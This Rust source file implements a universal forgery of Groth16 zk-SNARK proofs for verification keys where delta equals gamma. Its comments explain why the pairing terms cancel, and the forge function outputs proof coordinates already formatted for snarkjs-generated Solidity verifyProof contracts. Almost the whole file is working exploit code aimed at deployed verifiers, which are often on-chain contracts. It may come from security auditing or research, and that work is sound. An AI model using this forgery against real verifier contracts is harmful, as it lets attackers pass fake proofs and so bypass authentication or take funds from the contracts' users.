//! Construct the universal Groth16 forgery for a verification key whose
//! `delta == gamma`. No witness, no proving key, no circuit knowledge needed.
//!
//! Groth16 accepts `(A, B, C)` for public inputs `pub` iff
//!     e(-A, B) · e(alpha, beta) · e(vk_x, gamma) · e(C, delta) == 1
//! where `vk_x = IC[0] + Σ pub_i·IC[i]`.
//!
//! If `gamma == delta`, pick
//!     A := alpha,  B := beta,  C := -vk_x(pub)
//! then `e(-alpha,beta)·e(alpha,beta) == 1` and
//! `e(vk_x,gamma)·e(-vk_x,gamma) == 1`, so the product is 1 for *any* `pub`.

use crate::vk::{vk_x, Vk};
use ark_bn254::{Fr, G1Affine};
use ark_ec::AffineRepr;
use ark_ff::PrimeField;
use num_bigint::BigUint;

/// A forged proof, with points expressed as decimal coordinate strings in the
/// exact tuple order a snarkjs-generated Solidity `verifyProof` expects:
/// `pA[2], pB[2][2], pC[2], pubSignals[n]`. Note the G2 (`pB`) limbs are
/// emitted swapped (c1 before c0), matching snarkjs' Solidity template.
pub struct ForgedProof {
    pub p_a: [String; 2],
    pub p_b: [[String; 2]; 2],
    pub p_c: [String; 2],
    pub pub_signals: Vec<String>,
}

fn g1_xy(p: &G1Affine) -> [String; 2] {
    let (x, y) = p.xy().map(|(x, y)| (*x, *y)).unwrap_or_default();
    [dec(&BigUint::from(x.into_bigint())), dec(&BigUint::from(y.into_bigint()))]
}
fn dec(n: &BigUint) -> String {
    n.to_str_radix(10)
}

pub fn forge(vk: &Vk, public: &[Fr]) -> Result<ForgedProof, String> {
    if vk.delta != vk.gamma {
        return Err("VK is not exploitable by this forgery (delta != gamma)".into());
    }
    use ark_ec::CurveGroup;
    let a = vk.alpha;
    let b = vk.beta;
    let c_aff: G1Affine = (-vk_x(vk, public)?.into_group()).into_affine();

    // snarkjs Solidity template emits G2 coordinates with the c1 limb first.
    let (bx, by) = b.xy().map(|(x, y)| (*x, *y)).ok_or("beta is identity")?;
    let p_b = [
        [dec(&BigUint::from(bx.c1.into_bigint())), dec(&BigUint::from(bx.c0.into_bigint()))],
        [dec(&BigUint::from(by.c1.into_bigint())), dec(&BigUint::from(by.c0.into_bigint()))],
    ];

    Ok(ForgedProof {
        p_a: g1_xy(&a),
        p_b,
        p_c: g1_xy(&c_aff),
        pub_signals: public.iter().map(|s| dec(&BigUint::from(s.into_bigint()))).collect(),
    })
}
